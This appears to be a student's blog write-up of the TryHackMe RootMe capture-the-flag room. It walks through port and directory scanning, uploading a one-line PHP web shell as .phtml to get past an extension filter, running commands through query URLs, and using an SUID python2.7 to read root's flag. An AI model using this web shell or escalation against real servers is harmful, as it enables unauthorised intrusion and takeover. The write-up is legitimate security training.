Been a moment since the last post, I have been busy with midterms...

Anyways, today, we will be going over the RootMe room over at [TryHackMe](https://tryhackme.com/room/rrootme). I believe, by the name, this room/CTF is about getting to the root of the vulnerable machine.

Starting with reconnaissance, I will use `nmap`. A tool that is useful in scanning the network for open ports that can be exploited. I will run `nmap` on `10.201.124.246`, the IP address of the vulnerable machine.

`nmap` returned the following:

![nmap results](/images/THM%3A%20RootMe/nmap.png)


We have a `ssh` service open on port 22 and a `http` service open on port 80.

Since we have a `http` service, I will try to just search up the IP address on a browser to see if there is a website or not.

Fortunately, there is a website; however, there isn't anything interactive on it.

![website display](/images/THM%3A%20RootMe/web.png)

One of the questions in the CTF asks about what version of Apache the machine is running, and from my previous scan, we cannot really tell. However, `nmap` comes with many flags. Here is a handy cheatsheet - [nmap flags](https://www.stationx.net/nmap-cheat-sheet/)

In the cheatsheet, we see a `-sV` flag that could be run with `nmap` to determine which services are available and their versions.

![nmap results with versions for services](/images/THM%3A%20RootMe/serviceversion.png)

From the scan, we know that the machine is running on Apache 2.4.41.

Now, since there is a website available, we can snoop around with `gobuster`. A tool that is used to find directories on the web server that is hosting the website.

```markdown
gobuster dir -u [URL] -w [wordlist]
dir indicates directory bruteforcing mode; there are many different modes
-u [URL] specifies the target URL, in this case http://10.201.124.246
-w [wordlist] indicates what wordlist you would bruteforce with
```

![results of gobuster](/images/THM%3A%20RootMe/gobuster.png)

From `gobuster`, we have a few choices...
/css, /js, /panel, /uploads..

I think /panel stands out the most, since to me, it's like synonymous with admin panels. /css, /js, /uploads could contain information, but more likely than not, it's used to make the site appealing/functional - we will view them later.

Visiting `http://10.201.124.246/panel/` gave me a panel that prompts me to upload a file. I think whatever we upload could be seen in /uploads.

![panel error](/images/THM%3A%20RootMe/panelerror.png) <br>
*Error happened when I clicked upload without selecting a file*

Since I could upload a file - why not?

![doggo pic uploaded](/images/THM%3A%20RootMe/panelsuccess.png) <br>
*Successfully uploaded doggo.png*

After uploading the picture, I went to /uploads to see if my picture was there...

![uploads directory](/images/THM%3A%20RootMe/uploads.png)

There it is.

Anyways, apart from this tomfoolery, being able to upload files willy-nilly onto a server is pretty dangerous.

Now, let's go back and view what /css and /js had in store before moving on.

![what /css had](/images/THM%3A%20RootMe/css.png) <br>
*CSS directory, nothing too notable*

![what /js had](/images/THM%3A%20RootMe/js.png) <br>
*JS directory, also nothing notable*

![function in /js](/images/THM%3A%20RootMe/function.png) <br>
*Function found in js directory, maybe we could exploit something here, but it feels like the function is served more as an aesthetic*

Anyways, back to /panel - seems most likely exploitable and thus highest priority. We could maybe upload a file, like a script, to execute things on our behalf? For example, like a bash file?

After a quick Google Search, it seems like my plan will not work because scripts typically do not automatically execute unless they are placed in specific folders that are executed/read during startup and other operations done by the Task Scheduler.

However, I did find this... [File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)

The article goes over how we can exploit file uploads - mainly by uploading `web shells`, malicious scripts that are executed by the web server just by sending http requests. So I was in the right direction...

Anyways, let's use a template by PortSwigger, I will add the one-liner below into a .php file and upload it.

```markdown
<?php echo system($_GET['command']); ?>
```

![creating .php file](/images/THM%3A%20RootMe/bad.png)

![error, php not permitted](/images/THM%3A%20RootMe/notpermitted.png)

Seems like we cannot upload .php files... but let's see if we can upload .phtml files. .phtml files are basically .php files, but with html mixed in. There shouldn't really be any differences in functionality in this case.

This can be simply done by changing the file that we initially were going to upload into a .phtml, which can be done using the `mv` command on Linux. (`mv` is move)

```markdown
mv [old file location] [new file location]
```

In this case, we use `mv bad.php bad.phtml`. And then we reupload...

![uploaded .phtml](/images/THM%3A%20RootMe/permitted.png)

![upload proof](/images/THM%3A%20RootMe/uploaded.png)

So, now, with a .php equivalent file uploaded, we can exploit the web server by sending http requests. This can simply be done by replacing the query parameters.

For example, PortSwigger has this as a template.

```markdown
GET /example/exploit.php?command=id HTTP/1.1
```

From this template, we know that we need to be in the directory that houses our bad file, so we need to be in /uploads, and then we need to get to bad.phtml and query it with a command. In this case, PortSwigger used the `id` command. We will do the same.

```markdown
http://10.201.124.246/uploads/bad.phtml?command=id
http://10.201.124.246/uploads/bad.phtml?command=whoami
```

These queries returned an empty blank page, which seems like my .phtml script isn't really doing anything. This is reaffirmed by the fact that when I used `curl`, Content-Length of these queries were 0.

![curl proof](/images/THM%3A%20RootMe/curl.png)

So now, what I'm thinking is that perhaps the web server ignores these commands, or that when I echo'ed the command into the .phtml file, the double quotes may have messed up the initial command.

![command messed up](/images/THM%3A%20RootMe/badcommand.png)

It seems like the command that we echo'ed omitted the GET $_. One alternative to the double quotes would be the single quotes. Let's see if that works.

![echo now works](/images/THM%3A%20RootMe/workingcmd2.png)

Now, we reupload and then do the same test, but instead of running the previous queries, we will run them on bad2.phtml.

```markdown
http://10.201.124.246/uploads/bad2.phtml?command=id
http://10.201.124.246/uploads/bad2.phtml?command=whoami
http://10.201.124.246/uploads/bad2.phtml?command=pwd
```

![command now works](/images/THM%3A%20RootMe/idcmd.png) <br>
![command now works](/images/THM%3A%20RootMe/whoamicmd.png) <br>
![command now works](/images/THM%3A%20RootMe/pwdcmd.png)

From these commands, we essentially did some reconnaissance, especially from the last one, we see multiple directories that we can access or go back to.

One of the questions the CTF asks us is to find the flag related to `user.txt`. The way I approached this was to just navigate around, and accidentally stumbled across `user.txt` in the `/var/www` directory. I used `ls` as the command.

```markdown
http://10.201.124.246/uploads/bad2.phtml?command=ls /var/www/html
http://10.201.124.246/uploads/bad2.phtml?command=ls /var/www
```

![ls on /var/www/html](/images/THM%3A%20RootMe/html.png) <br>
![ls on /var/www](/images/THM%3A%20RootMe/www.png)

As you can see, the `user.txt` file is located in the `/var/www` directory. Another way to do this is to use the `find` command on Linux. Given that we had the necessary scope of directories from the `pwd` command, we can just run `find /var -name "user.txt`.

![using find](/images/THM%3A%20RootMe/find.png)

Now, all we have to do is open the `user.txt` to find the flag. This can be done by just querying `cat /var/www/user.txt`.

The next step is privilege escalation. We are tasked with finding files with the `SUID` permission. `SUID` is "Set User ID", so basically, what happens is when we execute a file with `SUID`, we aren't executing the file as the user, but rather, the owner who owns the file. So, for example, if `root` owns the file and we execute the file, we will execute the file as `root`.

So, if the file that we find allows us to put in some kind of input, that means we can essentially put in input and execute things as `root`.


```markdown
SUID : -rwsr--r--

First - : Normal file
rws : Owner can read, write, and notice that s is in the execute place. This indicates SUID permission.
r-- : Group can read, cannot write and execute
r-- : Other can read, cannot write and execute.
```
*This is an example of what an SUID file permission would look like*

To find files with the `SUID` permission, we need to use the `find` command on Linux. Specifically...

```markdown
find / -user root -perm /4000

find, starting from root (/), files that are created by user root.
Files that that have permission /4000.
The /4000 part matches any file that has the SUID bit.
It is not asking for an exact match.
```

![bro what is this](/images/THM%3A%20RootMe/gibberish.png)
*pathways to files that have the SUID permission*

As you can see, it is badly parsed... However, we can use a text splitter, like this [one](https://onlinetexttools.com/split-text). Now, the text is much more readable.

![split](/images/THM%3A%20RootMe/read.png)

Now, from this parsed text of files that have `SUID` permission, we immediately see a glaring problem.

`usr/bin/pyhton2.7` has `SUID` permission. Why is this a problem? Well, interpreters (like Python) do not usually come with `SUID`. This is because when we give `SUID` permission to the interpreter, when code is written, others can execute their code as `root`, which is extremely dangerous.

For example, we can escalate our privileges by doing:

```markdown
http://10.201.124.246/uploads/bad2.phtml?command=/usr/bin/python2.7 -c 'import os; os.setgid(0); os.setuid(0);'

We call Python, and by using the -c flag, we can write code that will be interpreted by Python.
In this case, we import the operating system and then tell it to set our current gid and uid to 0 (root).
```

But this doesn't actually do anything, we need to specify more commands to be executed as root after the os.setuid(0);.

So to complete the room, we need to open `root.txt`. But we don't really know where it is... However, we can just let os find it.

```markdown
http://10.201.124.246/uploads/bad2.phtml?command=/usr/bin/python2.7 -c 'import os; os.setgid(0); os.setuid(0); print(os.listdir("/root"))'
```

This tells the os to list items inside `/root`. Where we find `root.txt`.

![root](/images/THM%3A%20RootMe/root.png)

And then to open the file, we just run...

```markdown
http://10.201.124.246/uploads/bad2.phtml?command=/usr/bin/python2.7 -c 'import os; os.setgid(0); os.setuid(0); print(open("/root/root.txt").read())'
```

Giving us the final flag for the room.

Overall, I feel like I definitely could have done this in a better way (and more intended way) by creating an actual reverse shell instead of relying on the simple php command script. However, I still managed to get root "access" and completed the CTF. I have learned how to exploit `file uploads` by uploading php scripts that could be used maliciously by utilizing `http requests` and how to exploit `SUID` file permissions, alongside `GTFOBins` to escalate privileges.

uhhh... I also didn't know why the commands were giving me dups, but yeah.. :P

Thanks for reading!
